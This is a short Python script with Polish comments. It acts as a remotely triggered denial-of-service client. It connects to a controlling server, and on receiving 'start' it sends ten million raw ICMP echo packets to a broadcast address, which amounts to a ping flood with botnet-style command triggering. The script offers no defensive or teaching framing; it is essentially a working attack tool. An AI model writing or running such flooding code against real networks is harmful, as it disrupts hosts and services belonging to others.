import socket

# Ustawienia klienta
IP_ADDRESS = "192.168.31.21" # ustaw IP jakie chcesz
PORT = 1234

# Tworzymy gniazdo
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Łączymy się z serwerem
client_socket.connect((IP_ADDRESS, PORT))

# Wysyłamy dane do serwera
client_socket.send(b'Wiadomosc od klienta')

# Odbieramy dane od serwera
data = client_socket.recv(1024).decode()
print("Otrzymano od serwera: %s" % data)

if data == "start":
    import socket
    import struct

    #target host address
    target_host = "192.168.31.255" # ustaw IP jakie chcesz

    #create raw socket
    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    #SOCK_RAW - raw socket which means that the kernel will not try to interpret the data that we send
    #IPPROTO_ICMP - ICMP protocol

    #create packet header
    packet_header = struct.pack('!BBHHH', 8, 0, 0, 1, 0)

    # ! - network byte order
    # B - unsigned char
    # H - unsigned short
    # 8 - ICMP type
    # 0 - ICMP code
    # 0 - checksum
    # 1 - identifier
    # 0 - sequence number

    #create packet data
    packet_data = b"UwU"

    #create packet
    packet = packet_header + packet_data

    count = 0

    for i in range(10000000):
        #send packet to target

        count += 1

        if count == 100000:
            print("[+] 100000 packages send")
            count = 0

        client.sendto(packet, (target_host, 0))

    print("[+] Done")